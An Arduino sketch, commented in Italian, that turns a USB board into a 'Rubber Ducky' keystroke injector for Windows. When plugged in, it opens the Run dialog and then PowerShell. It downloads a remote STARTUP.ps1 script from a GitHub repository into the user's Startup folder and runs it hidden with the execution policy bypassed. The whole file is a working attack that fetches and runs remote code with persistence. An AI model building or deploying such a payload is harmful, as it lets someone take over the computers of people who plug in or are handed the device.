#include <Keyboard.h>  // Includi la libreria Keyboard
#include <Keyboard_it_IT.h>

void setup() {
  delay(1000);
  Keyboard.begin(KeyboardLayout_it_IT);  // Initialize the Keyboard library with Italian layout

  // Premi WIN + R per aprire la finestra "Esegui"
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);  // Attendi che la finestra "Esegui" appaia

  // Apri PowerShell
  Keyboard.print("powershell");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);  // Attendi che sia aperta

  // Scarica lo script PowerShell temporaneo
  Keyboard.print("powershell -Command \"Invoke-WebRequest 'https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/STARTUP.ps1' -OutFile '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\STARTUP.ps1'\"");

  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);  // Attendi che il download sia completato

  // Esegui lo script PowerShell temp.
  Keyboard.print("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\STARTUP.ps1\"");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();


  delay(500);

  // Chiudi il prompt
  Keyboard.print("exit");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // Empty
}